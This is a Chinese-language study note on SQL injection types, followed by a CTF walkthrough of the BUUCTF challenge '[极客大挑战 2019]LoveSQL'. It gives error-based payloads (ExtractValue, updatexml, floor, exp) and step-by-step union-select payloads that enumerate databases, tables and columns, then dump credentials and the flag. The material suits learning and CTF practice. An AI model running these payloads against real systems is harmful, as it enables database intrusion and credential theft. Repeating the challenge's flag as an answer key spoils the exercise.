
## 注入类型

- 字符型注入
使用条件：一个`'`或`"`就会暴露
> 记得通过`#`或`$`来结束语句
- 整形注入

- 联合查询注入
使用条件：在正常页面中存在 sql 语句并且展示时使用
利用方式：通过非法联合查询显示内容
`union` 默认去重，通过 `union all` 包含重复项
- 报错型注入
使用条件：页面不会直接返回内容，但是报错时会输出
利用方式：
1. `ExtractValue()`：这是一个针对 xml 的查询，通过xpath 语法错误返回内容
构造这个的方式也容易：`\`(`0x5c`) 和`~`(`0x7e`)
这是一个例子：`select ExtractValue('<a><b></b></a>','~');`
再配合 `concat()` 就能拼接希望获取的内容
`select ExtractValue('<a><b></b></a>',concat('~',(select database())))`
这样就能暴露出当前的数据库了
只要存在漏洞并且 xpath 报错回显，语句正确后面就会爆东西，表名、列名、字段数据都能爆
2. `UpdateXML(xml_target,xpath_expr,new_xml)`
xml_target：需要操作的 xml
xpath_expr：需要更新的 xpath
new_xml：更新内容
和`ExtractValue()`一致，xpath 错误时会报错，报错就能爆数据
这是一个例子：`select updatexml('test'，concat('~',(select database()))),'test'`
三个参数里面，只要 xml_target 正确，就能爆了
3. `floor()` 这个报错是因为 `group by` 向临时表插数据时，多次计算 `rand()` 导致插入临时表的主键重复而报错，但是报错前又执行了语句，所以抛出错误时就连着执行结果一起抛出来了
4. `exp()`
   这个比较少见，因为它负责的内容是去 e 的 x 次方，x 大于 709 时会报错，再借助`~`取反就会使报错稳定发生
5. 其他的存在报错型注入的函数
```sql
geometrycollection()
multipoint()
polygon()
multipolygon()
linestring()
multilinestring()
```
> 它们的本质都是利用 xpath 报错后，将后面的内容视为下一行并且继续执行导致的。
> 通过 updatexml() 和 ExtractValue() 报错对输出是有一定限制的，所以可以利用分割字符串的函数分割一下。
- 布尔型注入
使用条件：
利用方式：
- 时间盲注
使用条件：
利用方式：
- 二次注入
使用条件：
利用方式：
- 宽字节注入
使用条件：
利用方式：
- 堆叠注入
使用条件：
利用方式：
- http 头部注入
使用条件：
利用方式：

## 实例
字符型注入
### [极客大挑战 2019]LoveSQL

#### 判断漏洞

首先通过 `'`来截断语句，后面插入自定义内容

![[Pasted image 20240327170534.png]]

先输入`'`，得到如下内容

```
# You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
```

说明是**字符注入**

### 判断列数
输入`'union select 1;#`返回
![[Pasted image 20240327171112.png]]

`'union select 1,2;#`相同返回

但是`'union select 1,2,3;#`有了
![[Pasted image 20240327170747.png]]

说明表有三列

### 获取列名

`'union select 1,2,group_concat(schema_name) from information_schema.schemata;#`

返回如下结果：
![[Pasted image 20240327172406.png]]

解释语句：
`concat()`函数用于将多个字符串连接成一个字符串
`group_concat()`函数返回一个字符串结果，该结果由分组中的值连接组合而成
`schema_name` 数据库名
`information_schema.schemata` 数据库元信息
这句话的意思就是：选择整个数据库，并显示所有数据库的名字。前面的 1 和 2 是填充用的，满足三列的条件。

返回值也就意味着用户自定义的数据库有 test 和 geek

### 测试数据库字段

从 test 开始

`' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test';#`

返回结果
![[Pasted image 20240327175825.png]]
是一张空表

再试 geek
`' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek';#`

返回结果
![[Pasted image 20240327175458.png]]

那么表中存在两个列名： geekuser 和 l0ve1ysq1


### 确认列名

`' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' and table_name='l0ve1ysq1';#`
返回内容
![[Pasted image 20240327180028.png]]

那么我们就离答案越来越近了

借助这个组合，答案就是
`' union select 1,2,group_concat(username,password) from geek.l0ve1ysq1;#`

```
Hello 2！
Your password is 'cl4ywo_tai_nan_le,glzjinglzjin_wants_a_girlfriend,Z4cHAr7zCrbiao_ge_dddd_hm,0xC4m3llinux_chuang_shi_ren,Ayraina_rua_rain,Akkoyan_shi_fu_de_mao_bo_he,fouc5cl4y,fouc5di_2_kuai_fu_ji,fouc5di_3_kuai_fu_ji,fouc5di_4_kuai_fu_ji,fouc5di_5_kuai_fu_ji,fouc5di_6_kuai_fu_ji,fouc5di_7_kuai_fu_ji,fouc5di_8_kuai_fu_ji,leixiaoSyc_san_da_hacker,flagflag{04dd98d8-0e53-40c3-9676-fe988569862a}
```

flag 就在那里了，没什么好说的

## 参考链接

[FreeBuf网络安全行业门户](https://m.freebuf.com/articles/web/263553.html)
buu-ctf